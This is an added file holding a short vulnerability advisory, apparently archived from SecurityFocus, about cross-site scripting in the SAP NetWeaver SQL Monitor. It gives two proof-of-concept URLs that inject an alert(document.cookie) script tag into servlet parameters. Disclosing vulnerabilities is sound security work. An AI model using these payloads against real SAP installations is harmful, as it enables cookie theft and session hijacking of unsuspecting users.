@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/44904/info
+
+
+The SQL Monitor of SAP NetWeaver is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com:50100/OpenSQLMonitors/servlet/ConnectionMonitorServlet?view=stmtpool&node=12924950&ds=SAPSR3DB&connid
+=com.sap.sql.jdbc.direct.DirectPooledConnection@1ed00a7<script>alert(document.cookie)</script>
+
+http://www.example.com:50100/OpenSQLMonitors/servlet/CatalogBufferMonitorServlet?action=btnSHOW_COLUMNS&reqNode=12924950&reqBufferId=
+SAPSERVER:dm0:SAPSR3DB&reqTableColumns=BC_RPROF_PROFILE<script>alert(document.cookie)</script> 
